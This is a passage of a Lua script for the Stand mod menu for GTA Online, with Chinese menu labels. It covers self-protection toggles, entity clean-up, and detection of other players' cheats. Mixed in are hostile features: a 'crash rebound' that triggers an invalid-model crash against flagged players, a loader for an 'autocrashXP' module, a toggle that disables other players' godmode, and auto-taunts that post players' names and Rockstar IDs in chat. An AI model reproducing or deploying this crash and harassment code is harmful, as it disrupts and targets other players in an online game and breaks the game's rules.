    expaimkarma()
end)
menu.toggle_loop(aimkarma, '禁用无敌', {'JSgodAimKarma'}, '如果开着无敌的玩家瞄准你,这会通过向前推动他们的游戏画面来禁用他们的无敌模式.', function()
    godaimkarma()
end)
menu.action(aimkarma, 'Stand玩家瞄准惩罚', {}, '连接到Stand的玩家瞄准惩罚', function()
    menu.focus(menu.ref_by_path('World>Inhabitants>Player Aim Punishments>Anonymous Explosion', 37))
end)
local function raycast_gameplay_cam(flag, distance)
    local ptr1, ptr2, ptr3, ptr4 = memory.alloc(), memory.alloc(), memory.alloc(), memory.alloc()
    local cam_rot = CAM.GET_GAMEPLAY_CAM_ROT(0)
    local cam_pos = CAM.GET_GAMEPLAY_CAM_COORD()
    local direction = v3.toDir(cam_rot)
    local destination = 
    { 
        x = cam_pos.x + direction.x * distance, 
        y = cam_pos.y + direction.y * distance, 
        z = cam_pos.z + direction.z * distance 
    }
    SHAPETEST.GET_SHAPE_TEST_RESULT(
        SHAPETEST.START_EXPENSIVE_SYNCHRONOUS_SHAPE_TEST_LOS_PROBE(
            cam_pos.x, 
            cam_pos.y, 
            cam_pos.z, 
            destination.x, 
            destination.y, 
            destination.z, 
            flag, 
            players.user_ped(), 
            1
        ), ptr1, ptr2, ptr3, ptr4)
    local p1 = memory.read_int(ptr1)
    local p2 = memory.read_vector3(ptr2)
    local p3 = memory.read_vector3(ptr3)
    local p4 = memory.read_int(ptr4)
    return {p1, p2, p3, p4}
end
menu.toggle_loop(weapon, '4D方框瞄准', {'_4d_crosshair'}, '', function()
    request_texture_dict_load('visualflow')
    local rc = raycast_gameplay_cam(-1, 10000.0)[2]
    local c = players.get_position(players.user())
    local dist = MISC.GET_DISTANCE_BETWEEN_COORDS(rc.x, rc.y, rc.z, c.x, c.y, c.z, false)
    local dir = v3.toDir(CAM.GET_GAMEPLAY_CAM_ROT(0))
    size = {}
    size.x = 0.5+(dist/50)
    size.y = 0.5+(dist/50)
    size.z = 0.5+(dist/50)
    GRAPHICS.DRAW_MARKER(3, rc.x, rc.y, rc.z, 0.0, 0.0, 0.0, 0.0, 90.0, 0.0, size.y, 1.0, size.x, 35, 35, 255, 200, false, true, 2, false, 'visualflow', 'crosshair')
end)
menu.toggle_loop(weapon, "快速更换武器", {"fasthands"}, "更快地更换你的武器.", function()
    if TASK.GET_IS_TASK_ACTIVE(players.user_ped(), 56) then
        PED.FORCE_PED_AI_AND_ANIMATION_UPDATE(players.user_ped())
    end
end)
menu.toggle_loop(protections, "拦截抢劫犯", {}, "", function() 
dibai4()
end)
load_crash_XP = menu.action(protections, "开启自动崩溃XP魔怔人", {}, "", function()
    notification("[夜幕 提示] \n自动崩溃XP魔怔人已准备就绪", colors.black)
    require "lib.yymmlib.autocrashXP"
    menu.delete(load_crash_XP)
end)
menu.action(protections, "移除附加物", {""}, "", function()
		notification("搞定", colors.black)
dibai5()
end)
    menu.action(protections, "强制停止所有声音事件", {""}, "", function()
        for i=-1,100 do
            AUDIO.STOP_SOUND(i)
            AUDIO.RELEASE_SOUND_ID(i)
        end
	end)
menu.action(protections, "超级清除", {"superclear"}, "来一波炒鸡清除", function()
dibai6()
	end)
menu.toggle_loop(protections, "循环清除世界", {clearworlds}, "用完记得关闭此选项", function()
		MISC.CLEAR_AREA(0,0,0 , 1000000, true, true, true, true)
end)

    menu.list_action(protections, "清除全部", {}, "", {"NPC", "载具", "物体", "可拾取物体", "货车", "发射物", "声音"}, function(index, name)
    dibai49(index, name)
end)
local pool_limiter = menu.list(protections, "实体池限制", {}, "")
local ped_limit = 175
menu.slider(pool_limiter, "人物池限制", {"pedlimit"}, "", 0, 256, 175, 1, function(amount)
    ped_limit = amount
end)
local veh_limit = 200
menu.slider(pool_limiter, "载具池限制", {"vehlimit"}, "", 0, 300, 150, 1, function(amount)
    veh_limit = amount
end)
local obj_limit = 750
menu.slider(pool_limiter, "物体池限制", {"objlimit"}, "", 0, 2300, 750, 1, function(amount)
    obj_limit = amount
end)
local projectile_limit = 25
menu.slider(pool_limiter, "投掷物池限制", {"projlimit"}, "", 0, 50, 25, 1, function(amount)
    projectile_limit = amount
end)
menu.toggle_loop(pool_limiter, "启用实体池限制", {}, "", function()
    local ped_count = 0
    for _, ped in pairs(entities.get_all_peds_as_handles()) do
        util.yield()
        if ped ~= players.user_ped() then
            ped_count += 1
        end
        if ped_count >= ped_limit then
            for _, ped in pairs(entities.get_all_peds_as_handles()) do
                util.yield()
                entities.delete_by_handle(ped)
            end
            util.toast("[夜幕Lua 提示你] 人物池达到上限,正在清理...")
        end
    end
    local veh__count = 0
    for _, veh in ipairs(entities.get_all_vehicles_as_handles()) do
        util.yield()
        veh__count += 1
        if veh__count >= veh_limit then
            for _, veh in ipairs(entities.get_all_vehicles_as_handles()) do
                entities.delete_by_handle(veh)
            end
            util.toast("[夜幕Lua 提示你] 载具池达到上限,正在清理...")
        end
    end
    local obj_count = 0
    for _, obj in pairs(entities.get_all_objects_as_handles()) do
        util.yield()
        obj_count += 1
        if obj_count >= obj_limit then
            for _, obj in pairs(entities.get_all_objects_as_handles()) do
                util.yield()
                entities.delete_by_handle(obj)
            end
            util.toast("[夜幕Lua 提示你] 物体池达到上限,正在清理...")
        end
    end
end)
menu.toggle_loop(protections, "阻止变成野兽", {}, "阻止他们用Stand把你变成野兽", function()
    if SCRIPT.GET_NUMBER_OF_THREADS_RUNNING_THE_SCRIPT_WITH_THIS_HASH(util.joaat("am_hunt_the_beast")) > 0 then
        local host
        repeat
            host = NETWORK.NETWORK_GET_HOST_OF_SCRIPT("am_hunt_the_beast", -1, 0)
            util.yield()
        until host ~= -1
        menu.trigger_command(menu.ref_by_path("Online>Session>Session Scripts>Hunt the Beast>Stop Script"))
    end
end)
menu.toggle_loop(protections, "过渡助手", {"transitionhelper"}, "避免在切换战局时提前清除自己的PED模型而导致卡云 在进行任务时 请关闭此选项和克隆清理选项", function()
    if util.is_session_transition_active() then
        menu.trigger_commands("BlockClones off")
    end
    util.yield(6000)
    menu.trigger_commands("BlockClones on")
end)
menu.toggle_loop(protections, "克隆清理", {"BlockClones"}, "当检测到你周围存在克隆模型时会自动尝试清理 如果出现连续的清理通知但实际上并没有清理掉 说明对方阻止了网络事件 请确保针对阻止网络事件的作弊者开启了超时", function()
    for i, ped in ipairs(entities.get_all_peds_as_handles()) do
    if ENTITY.GET_ENTITY_MODEL(ped) == ENTITY.GET_ENTITY_MODEL(players.user_ped()) and not PED.IS_PED_A_PLAYER(ped) and not util.is_session_transition_active() then
        notification("检测到克隆模型 正在尝试清理", colors.black)
        entities.delete_by_handle(ped)
        util.yield(100)
    end
    end
end)
menu.divider(protections, "崩溃保护")	
    menu.toggle_loop(protections, "拦截不好载具", {}, "如货机等(刷不出来车请关掉此防护)", function()
    dibai8()
    end)
    menu.toggle_loop(protections, "拦截粒子效果", {}, "", function()
    dibai9()
    end)
    
    menu.toggle_loop(protections, "拦截火焰效果", {}, "", function()
        dibai24()
    end)
-------------------------------------
-- ANTICAGE
-------------------------------------
local cageModels <const> =
{
	"prop_gold_cont_01",
	"prop_gold_cont_01b",
	"prop_feeder1_cr",
	"prop_rub_cage01a",
	"stt_prop_stunt_tube_s",
	"stt_prop_stunt_tube_end",
	"prop_jetski_ramp_01",
	"stt_prop_stunt_tube_xs",
	"prop_fnclink_03e",
	"prop_container_05a",
	"prop_jetski_ramp_01",
    "prop_cs_dumpster_01a",
    "p_v_43_safe_s",
    "bkr_prop_moneypack_03a",
	"prop_elecbox_12"
}
local lastMsg = ""
local lastNotification <const> = newTimer()
local format = "笼子物体来自 %s"

menu.toggle_loop(protections, "反笼子", {"anticage"}, "请不要在任务中开启", function()
	local myPos = players.get_position(players.user())
	for _, model in ipairs(cageModels) do
		local modelHash <const> =  util.joaat(model)
		local obj = OBJECT.GET_CLOSEST_OBJECT_OF_TYPE(myPos.x,myPos.y,myPos.z, 8.0, modelHash, false, false, false)
		if obj == 0 or not ENTITY.DOES_ENTITY_EXIST(obj) or
		not ENTITY.IS_ENTITY_AT_ENTITY(players.user_ped(), obj, 5.0, 5.0, 5.0, false, true, 0) then
			continue
		end
		local ownerId = get_entity_owner(obj)
		local msg = string.format(format, get_condensed_player_name(ownerId))
		if ownerId ~= players.user() and is_player_active(ownerId, false, false) and
		(lastMsg ~= msg or lastNotification.elapsed() >= 15000) then
			notification(msg, HudColour.blueLight)
			lastMsg = msg
			lastNotification.reset()
		end
		request_control(obj, 1500)
		entities.delete_by_handle(obj)
	end
end)
	menu.toggle(protections, "阻止网络事件", {}, "阻止网络事件传输", function(on_toggle)
        local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
        local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
		if on_toggle then
			menu.trigger_command(BlockNetEvents)
			notification("已阻止所有网络传输", colors.green)
		else
			menu.trigger_command(UnblockNetEvents)
			notification("关闭阻止网络传输", colors.red)
		end
	end)

	menu.toggle(protections, "阻止传入", {}, "阻止网络事件传入", function(on_toggle)
        local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
        local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
		if on_toggle then
			menu.trigger_command(BlockIncSyncs)
			notification("开启阻止网络事件传入", colors.green)
		else
			menu.trigger_command(UnblockIncSyncs)
			notification("关闭阻止网络事件传入", colors.red)
		end
	end)
	menu.toggle(protections, "阻止传出", {}, "阻止网络事件传出", function(on_toggle)
		if on_toggle then
			notification("开启阻止网络事件传出", colors.green)
			menu.trigger_commands("desyncall on")
		else
			notification("关闭阻止网络事件传出", colors.red)
			menu.trigger_commands("desyncall off")
		end
	end)
	menu.toggle(protections, "防崩视角", {"acc"}, "", function(on_toggle)
		if on_toggle then
			notification("开启防崩视角", colors.green)
			menu.trigger_commands("anticrashcam on")
			menu.trigger_commands("potatomode on")
		else
			notification("关闭防崩视角", colors.red)
			menu.trigger_commands("anticrashcam off")
			menu.trigger_commands("potatomode off")
		end
	end)

	menu.toggle(protections, "自闭模式", {"panic"}, "没错就是自闭", function(on_toggle)
        local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
        local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
        local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
        local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
        if on_toggle then
            notification("开启自闭模式", colors.green)
            menu.trigger_commands("desyncall on")
            menu.trigger_command(BlockIncSyncs)
            menu.trigger_command(BlockNetEvents)
            menu.trigger_commands("anticrashcamera on")
        else
            notification("关闭自闭模式", colors.red)
            menu.trigger_commands("desyncall off")
            menu.trigger_command(UnblockIncSyncs)
            menu.trigger_command(UnblockNetEvents)
            menu.trigger_commands("anticrashcamera off")
        end
	end)
menu.toggle(protections, "攻击嘲讽", {"ridicule"}, "", function(state)
    cf = state
    _U_hack_list={}
    while cf do
        util.yield(0)
        for PlayerID=0,31 do
            if PlayerID~= PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID) then
                if players.is_marked_as_attacker(PlayerID,1 << 0x03) or players.is_marked_as_attacker(PlayerID,1 << 0x04) or players.is_marked_as_attacker(PlayerID,1 << 0x05) or players.is_marked_as_attacker(PlayerID,1 << 0x0C) or players.is_marked_as_attacker(PlayerID,1 << 0x0D) or players.is_marked_as_attacker(PlayerID,1 << 0x0E) then
                    if not _U_hack_list[PlayerID+1] then
                        chat.send_message(PLAYER.GET_PLAYER_NAME(PlayerID)..chaofeng.."\nRID:"..players.get_rockstar_id(PlayerID),false,true,true)
                        _U_hack_list[PlayerID+1]=true
                    end
                else
                    _U_hack_list[PlayerID+1]=false
                end
            end
        end
    end
end)
menu.trigger_commands("ridicule on")
menu.toggle_loop(protections, "攻击反弹V1", {"crashrebound"}, "", function()
    for _, PlayerID in ipairs(players.list(false, true, true)) do
        if players.is_marked_as_attacker(PlayerID,1 << 0x03) or players.is_marked_as_attacker(PlayerID,1 << 0x04) or players.is_marked_as_attacker(PlayerID,1 << 0x05) or players.is_marked_as_attacker(PlayerID,1 << 0x0C) or players.is_marked_as_attacker(PlayerID,1 << 0x0D) or players.is_marked_as_attacker(PlayerID,1 << 0x0E) then
            menu.trigger_commands("nature") 
                break
            end
        end
end)
menu.toggle_loop(protections, "攻击反弹V2", {"crashrebound2"}, "", function()
    _U_hack_list={}
    while true do
        util.yield(0)
        for PlayerID=0,31 do
            if PlayerID~= PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID) then
                if players.is_marked_as_attacker(PlayerID,1 << 0x03) or players.is_marked_as_attacker(PlayerID,1 << 0x04) or players.is_marked_as_attacker(PlayerID,1 << 0x05) or players.is_marked_as_attacker(PlayerID,1 << 0x0C) or players.is_marked_as_attacker(PlayerID,1 << 0x0D) or players.is_marked_as_attacker(PlayerID,1 << 0x0E) then
                    if not _U_hack_list[PlayerID+1] then
                        menu.trigger_commands("invalidmodelcrash") 
                        _U_hack_list[PlayerID+1]=true
                    end
                else
                    _U_hack_list[PlayerID+1]=false
                end
            end
        end
    end
end)
menu.divider(protections, "防套笼保护")
local anticage = menu.list(protections, "防套笼", {}, "使你无法被任何物体所笼罩")
local alpha = 160
menu.slider(anticage, "笼子Alpha", {"cagealpha"}, "物体将具有的透明度", 0, #values, 3, 1, function(amount)
    alpha = values[amount]
end)
menu.toggle_loop(anticage, "启用笼子拦截", {"anticage"}, "", function()
    local user = players.user_ped()
    local veh = PED.GET_VEHICLE_PED_IS_USING(user)
    local my_ents = {user, veh}
    for i, obj_ptr in ipairs(entities.get_all_objects_as_pointers()) do
        local net_obj = memory.read_long(obj_ptr + 0xd0)
        if net_obj == 0 or memory.read_byte(net_obj + 0x49) == players.user() then
            continue
        end
        local obj_handle = entities.pointer_to_handle(obj_ptr)
        CAM.SET_GAMEPLAY_CAM_IGNORE_ENTITY_COLLISION_THIS_UPDATE(obj_handle)
        for i, data in ipairs(my_ents) do
            if data ~= 0 and ENTITY.IS_ENTITY_TOUCHING_ENTITY(data, obj_handle) and alpha > 0 then
                ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(obj_handle, data, false)
                ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(data, obj_handle, false)
                ENTITY.SET_ENTITY_ALPHA(obj_handle, alpha, false)
            end
            if data ~= 0 and ENTITY.IS_ENTITY_TOUCHING_ENTITY(data, obj_handle) and alpha == 0 then
                entities.delete_by_handle(obj_handle)
            end
        end
        SHAPETEST.RELEASE_SCRIPT_GUID_FROM_ENTITY(obj_handle)
    end
end)
menu.divider(protections, "玩家信息检测")
detection = menu.list(protections, "玩家检测", {}, "", function(); end)
menu.toggle(detection, "一键开启", {}, "", function(on)
    if on then
        menu.set_value(pin1,true)
        menu.set_value(pin2,true)
        menu.set_value(pin3,true)
        menu.set_value(pin4,true)
        menu.set_value(pin5,true)
        menu.set_value(pin6,true)
        menu.set_value(pin7,true)
        menu.set_value(pin8,true)
        menu.set_value(pin9,true)
        menu.set_value(pin10,true)
        menu.set_value(pin11,true)
        menu.set_value(pin12,true)
        menu.set_value(pin13,true)
    else
        menu.set_value(pin1,false)
        menu.set_value(pin2,false)
        menu.set_value(pin3,false)
        menu.set_value(pin4,false)
        menu.set_value(pin5,false)
        menu.set_value(pin6,false)
        menu.set_value(pin7,false)
        menu.set_value(pin8,false)
        menu.set_value(pin9,false)
        menu.set_value(pin10,false)
        menu.set_value(pin11,false)
        menu.set_value(pin12,false)
        menu.set_value(pin13,false)
    end
end)
local function BitTest(bits, place)
    return (bits & (1 << place)) ~= 0
end
local function IsPlayerUsingOrbitalCannon(player)
    return BitTest(memory.read_int(memory.script_global((2657589 + (player * 466 + 1) + 427))), 0) -- Global_2657589[PLAYER::PLAYER_ID() /*466*/].f_427), 0
end
local function get_interior_player_is_in(pid)
    return memory.read_int(memory.script_global(((2657589 + 1) + (pid * 466)) + 245)) -- Global_2657589[bVar0 /*466*/].f_245
end
local function get_spawn_state(pid)
    return memory.read_int(memory.script_global(((2657589 + 1) + (pid * 466)) + 232)) -- Global_2657589[PLAYER::PLAYER_ID() /*466*/].f_232
end
menu.divider(detection,"检测列表")  
pin1 = menu.toggle_loop(detection, "无敌模式", {}, "检测战局玩家是否在使用无敌.", function()
    for _, PlayerID in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
        for _, id in ipairs(interior_stuff) do
            if players.is_godmode(PlayerID) and not players.is_in_interior(PlayerID) and not NETWORK.NETWORK_IS_PLAYER_FADING(PlayerID) and ENTITY.IS_ENTITY_VISIBLE(ped) and get_spawn_state(PlayerID) == 99 and get_interior_player_is_in(PlayerID) == id then
                util.draw_debug_text(players.get_name(PlayerID) .. "是无敌,很有可能是作弊者")
                break
            end
        end
    end 
end)
pin2 = menu.toggle_loop(detection, "载具无敌模式", {}, "检测玩家载具是否在使用无敌.", function()
    for _, PlayerID in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
        local vehicle = PED.GET_VEHICLE_PED_IS_USING(ped)
        local driver = NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(VEHICLE.GET_PED_IN_VEHICLE_SEAT(vehicle, -1))
        if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
            for _, id in ipairs(interior_stuff) do
                if not ENTITY.GET_ENTITY_CAN_BE_DAMAGED(vehicle) and not NETWORK.NETWORK_IS_PLAYER_FADING(PlayerID) and ENTITY.IS_ENTITY_VISIBLE(ped) 
                and get_spawn_state(PlayerID) == 99 and get_interior_player_is_in(PlayerID) == id and PlayerID == driver then
                    util.draw_debug_text(players.get_name(driver) .. "的载具处于无敌模式")
                    break
                end
            end
        end
    end 
end)
pin3 = menu.toggle_loop(detection, "未发布的载具", {}, "检测是否有玩家在驾驶尚未发布的载具.", function()
    for _, PlayerID in ipairs(players.list(false, true, true)) do
        local modelHash = players.get_vehicle_model(PlayerID)
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local vehicle = PED.GET_VEHICLE_PED_IS_USING(ped)
        local driver = NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(VEHICLE.GET_PED_IN_VEHICLE_SEAT(vehicle, -1))
        for i, name in ipairs(unreleased_vehicles) do
            if modelHash == util.joaat(name) and PED.IS_PED_IN_ANY_VEHICLE(ped, false) and PlayerID == driver then
                util.draw_debug_text(players.get_name(driver) .. " 正在驾驶未发布载具 " .. "(" .. name .. ")")
            end
        end
    end
end)
pin4 = menu.toggle_loop(detection, "作弊武器", {}, "检测是否有玩家使用无法获得的武器.", function()
    for _, PlayerID in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        for i, hash in ipairs(modded_weapons) do
            local weapon_hash = util.joaat(hash)
            if WEAPON.HAS_PED_GOT_WEAPON(ped, weapon_hash, false) and (WEAPON.IS_PED_ARMED(ped, 7) or TASK.GET_IS_TASK_ACTIVE(ped, 8) or TASK.GET_IS_TASK_ACTIVE(ped, 9)) then
                util.toast(players.get_name(PlayerID) .. " 使用隐藏的武器 " .. "(" .. hash .. ")")
                break
            end
        end
    end
end)
pin5 = menu.toggle_loop(detection, "作弊载具", {}, "检测是否有玩家正在使用无法获得的载具.", function()
    for _, PlayerID in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local vehicle = PED.GET_VEHICLE_PED_IS_USING(ped)
        local modelHash = players.get_vehicle_model(PlayerID)
        local driver = NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(VEHICLE.GET_PED_IN_VEHICLE_SEAT(vehicle, -1))
        for i, name in ipairs(modded_vehicles) do
            if modelHash == util.joaat(name) and PlayerID == driver then
                util.draw_debug_text(players.get_name(driver) .. " Is Driving A Modded Vehicle " .. "(" .. name .. ")")
                break
            end
        end
    end
end)
pin6 = menu.toggle_loop(detection, "自由镜头检测", {}, "检测是否有玩家使用自由镜头(又称无碰撞)", function()
    for _, PlayerID in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local ped_ptr = entities.handle_to_pointer(ped)
        local vehicle = PED.GET_VEHICLE_PED_IS_USING(ped)
        local oldpos = players.get_position(PlayerID)
        util.yield()
        local currentpos = players.get_position(PlayerID)
        local vel = ENTITY.GET_ENTITY_VELOCITY(ped)
        if not util.is_session_transition_active() and players.exists(PlayerID)
        and get_interior_player_is_in(PlayerID) == 0 and get_spawn_state(PlayerID) ~= 0
        and not PED.IS_PED_IN_ANY_VEHICLE(ped, false) -- 当玩家开车时有很多误报,所以去他妈的.
        and not NETWORK.NETWORK_IS_PLAYER_FADING(PlayerID) and ENTITY.IS_ENTITY_VISIBLE(ped) and not PED.IS_PED_DEAD_OR_DYING(ped)
        and not PED.IS_PED_CLIMBING(ped) and not PED.IS_PED_VAULTING(ped) and not PED.IS_PED_USING_SCENARIO(ped)
        and not TASK.GET_IS_TASK_ACTIVE(ped, 160) and not TASK.GET_IS_TASK_ACTIVE(ped, 2)
        and v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_position(PlayerID)) <= 395.0 --如果数值为 400 会导致误报
        and ENTITY.GET_ENTITY_HEIGHT_ABOVE_GROUND(ped) > 5.0 and not ENTITY.IS_ENTITY_IN_AIR(ped) and entities.player_info_get_game_state(ped_ptr) == 0
        and oldpos.x ~= currentpos.x and oldpos.y ~= currentpos.y and oldpos.z ~= currentpos.z 
        and vel.x == 0.0 and vel.y == 0.0 and vel.z == 0.0 then
            util.toast(players.get_name(PlayerID) .. " 是无碰撞")
            break
        end
    end
end)
pin7 = menu.toggle_loop(detection, "超级驾驶检测", {}, "检测是否有玩家在修改载具速度", function()
    for _, PlayerID in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local vehicle = PED.GET_VEHICLE_PED_IS_USING(ped)
        local veh_speed = (ENTITY.GET_ENTITY_SPEED(vehicle)* 2.236936)
        local class = VEHICLE.GET_VEHICLE_CLASS(vehicle)
        local driver = NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(VEHICLE.GET_PED_IN_VEHICLE_SEAT(vehicle, -1))
        if class ~= 15 and class ~= 16 and veh_speed >= 200 and (players.get_vehicle_model(PlayerID) ~= util.joaat("oppressor") and players.get_vehicle_model(PlayerID) ~= util.joaat("oppressor2")) and PlayerID == driver then
            util.toast(players.get_name(driver) .. " 正在使用超级驾驶")
            break
        end
    end
end)
pin8 = menu.toggle_loop(detection, "观看检测", {}, "检测是否有玩家在观看你.", function()
    for _, PlayerID in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        if not PED.IS_PED_DEAD_OR_DYING(ped) and not NETWORK.NETWORK_IS_PLAYER_FADING(PlayerID) then
            if v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_cam_pos(PlayerID)) < 15.0 and v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_position(PlayerID)) > 50.0 then
                util.toast(players.get_name(PlayerID) .. " 正在观看你")
                break
            end
        end
    end
end)
pin9 = menu.toggle_loop(detection, "雷霆加入检测", {}, "检测是否有玩家使用了雷霆加入.", function()
    for _, PlayerID in ipairs(players.list(false, true, true)) do
        if get_spawn_state(players.user()) == 0 then return end
        local old_sh = players.get_script_host()
        util.yield(100)
        local new_sh = players.get_script_host()
        if old_sh ~= new_sh then
            if get_spawn_state(PlayerID) == 0 and players.get_script_host() == PlayerID then
                util.toast(players.get_name(PlayerID) .. " 触发了雷霆加入检测，现在被归类为作弊者")
            end
        end
    end
end)
pin10 = menu.toggle_loop(detection, "修改后的天基炮", {}, "检测是否有人在使用修改过的天基炮.", function()
    for _, PlayerID in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        if IsPlayerUsingOrbitalCannon(PlayerID) and not TASK.GET_IS_TASK_ACTIVE(ped, 135) then
            util.toast(players.get_name(PlayerID) .. " 正在使用修改过的天基炮")
        end
    end
end)
pin11 = menu.toggle_loop(detection, "传送检测", {}, "", function()
    for _, PlayerID in ipairs(players.list(true, true, true)) do
        local old_pos = players.get_position(PlayerID)
        util.yield(50)
        local cur_pos = players.get_position(PlayerID)
        local distance_between_tp = v3.distance(old_pos, cur_pos)
        for _, id in ipairs(interior_stuff) do
            if get_interior_player_is_in(PlayerID) == id and get_spawn_state(PlayerID) ~= 0 and players.exists(PlayerID) then
                util.yield(100)
                if distance_between_tp > 300.0 then
                    util.toast(players.get_name(PlayerID) .. " 传送到 " .. SYSTEM.ROUND(distance_between_tp) .. " 米")
                end
            end
        end
    end
end)
pin12 = menu.toggle_loop(detection, "天基炮", {}, "检测是否有人在使用天基炮.", function()
    for _, PlayerID in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        if IsPlayerUsingOrbitalCannon(PlayerID) and TASK.GET_IS_TASK_ACTIVE(ped, 135) then
            util.draw_debug_text(players.get_name(PlayerID) .. " 是在轨道炮处")
        end
    end
end)
pin13 = menu.toggle_loop(detection, "狗屎无敌模式检测", {}, "检测是否有人通过触发某种突发事件来获得无敌模式.\n这是一个哪怕绿玩也可以卡出来的垃圾无敌", function()
    for _, PlayerID in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, false) 
        local height = ENTITY.GET_ENTITY_HEIGHT_ABOVE_GROUND(ped)
        for _, id in ipairs(interior_stuff) do
            if players.is_in_interior(PlayerID) and players.is_godmode(PlayerID) and not NETWORK.NETWORK_IS_PLAYER_FADING(PlayerID) and ENTITY.IS_ENTITY_VISIBLE(ped) and get_spawn_state(PlayerID) == 99 and get_interior_player_is_in(PlayerID) == id then
                util.draw_debug_text(players.get_name(PlayerID) .. " 正在使用Bug卡出来的垃圾无敌")
                break
            end
        end
    end 
end)
local misc = menu.list(menu.my_root(), "其它选项", {}, "")
menu.action(misc, "重新启动游戏", {}, "", function(on_click)
    MISC._RESTART_GAME()
end)
zhuti = menu.list(misc,"主题变色", {},"炒鸡炫酷！~")
zhutibianse = menu.action(zhuti, "加载主题选项", {""}, "", function()
        notification("正在加载主题选项,请稍等...",colors.blue)
        util.yield(2000)
        require "lib.yymmlib.YMPulsive"
        menu.delete(zhutibianse)
    end)
function newColor(R, G, B, A)
    return {r = R, g = G, b = B, a = A}
end
local overlay_x = 0.0052
local overlay_y = 0.18519
local run = true
local x, y = directx.get_client_size()
local ratio = x/y
local size = 0.03
local boxMargin = size / 7
local overlay_x = 0.0400
local overlay_y = 0.1850
local key_text_color = newColor(1, 1, 1, 1)
local background_colour = newColor(0, 0, 0, 0.2)
local pressed_background_colour = newColor(2.55/255, 2.55/255, 2.55/255, 0.5490196078431373)
local spaceBarLength = 3
local spaceBarSlim = 1
local altSpaceBar = 0
VT = menu.list(misc, "按键显示", {}, "", function(); 
end)
menu.toggle(VT, '按键开关', {'anjian'}, '', function(off) 
	run = off
end, true)
menu.slider(VT, 'X轴坐标', {'x-position'}, '',1 , 10000, overlay_x * 10000, 1, function(value)
	overlay_x = value / 10000
end)
menu.slider(VT, 'Y轴坐标', {'y-position'}, '',1 , 10000, overlay_y * 10000, 1, function(value)
	overlay_y = value / 10000
end)
menu.slider(VT, '尺寸', {'size'}, '',1 , 10000, 300, 1, function(value)
	size = value / 10000
    boxMargin = size / 7
end)
local hideKey = false
menu.toggle(VT, '隐藏按键文本', {'hide-text'}, '', function(toggle)
    hideKey = toggle
end)
local hide_root = menu.list(VT, '隐藏按键', {''}, '')
for i = 1, #wasd do
    menu.toggle(hide_root, wasd[i].key, {}, '', function(toggle)
        wasd[i].show = not toggle
    end)
end
menu.toggle(VT, '短空格键', {'short-space'}, '', function(toggle)
    if toggle then
        spaceBarLength = 2
    else
        spaceBarLength = 3
    end
end)
menu.toggle(VT, '窄空格键', {'slim-space'}, '', function(toggle)
    if toggle then
        spaceBarSlim = 2
    else
        spaceBarSlim = 1
    end
end)
local center_space_toggle center_space_toggle = menu.toggle(VT, '中间空格键', {'alt-space'}, '使空格在 A、S、D 下居中。这需要shift和ctrl关闭.', function(toggle)
    if altShiftCtrl and (wasd[10].show or wasd[9].show) then
        altSpaceBar = 1
        return
    end
    if toggle then
        altSpaceBar = 0
    else
        altSpaceBar = 1
    end
end, true)
menu.toggle(VT, '窄 shift和ctrl键', {'slim-shift-ctrl'}, '', function(toggle)
    altShiftCtrl = toggle
    if toggle and menu.get_value(center_space_toggle) == 1 then
        menu.trigger_command(center_space_toggle, 'off')
    else
        menu.trigger_command(center_space_toggle, 'on')
    end
end)
util.create_tick_handler(function()
    if run then
        for i = 1, #wasd do
            wasd[i].pressed = false
            for j = 1, #wasd[i].keys do
                if PAD.IS_CONTROL_PRESSED(2, wasd[i].keys[j]) then
                    wasd[i].pressed = true
                end
            end
        end
        for i = 1, #wasd - 3 do
            if wasd[i].show then
